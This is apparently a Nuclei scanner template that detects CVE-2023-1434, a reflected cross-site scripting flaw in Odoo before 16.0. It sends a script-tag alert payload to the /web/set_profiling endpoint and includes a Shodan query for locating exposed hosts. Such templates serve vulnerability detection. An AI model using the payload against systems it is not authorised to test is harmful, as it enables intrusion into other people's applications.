id: CVE-2023-1434

info:
  name: Odoo - Cross-Site Scripting
  author: DhiyaneshDK
  severity: medium
  description: |
    Odoo is a business suite that has features for many business-critical areas, such as e-commerce, billing, or CRM. Versions before the 16.0 release are vulnerable to CVE-2023-1434 and is caused by an incorrect content type being set on an API endpoint.
  remediation: |
    Apply the latest security patches or updates provided by the vendor to fix this vulnerability.
  reference:
    - https://www.sonarsource.com/blog/odoo-get-your-content-type-right-or-else
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-1434
  classification:
    cve-id: CVE-2023-1434
    cwe-id: CWE-79
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"Odoo"
  tags: cve,cve2023,odoo,xss

http:
  - method: GET
    path:
      - "{{BaseURL}}/web/set_profiling?profile=0&collectors=<script>alert(document.domain)</script>"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<script>alert(document.domain)</script>'
          - '"params":'
          - 'session'
        condition: and

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200

# digest: 490a0046304402206aca9c974becbffd46255feaa2ba0db4491e5219a35c0cbc3db40fd20486142d02202661ddbc904295781fbbdea1b323355da660ee9b7a33d68fe758aced5040f602:922c64590222798bb761d5b6d8e72950
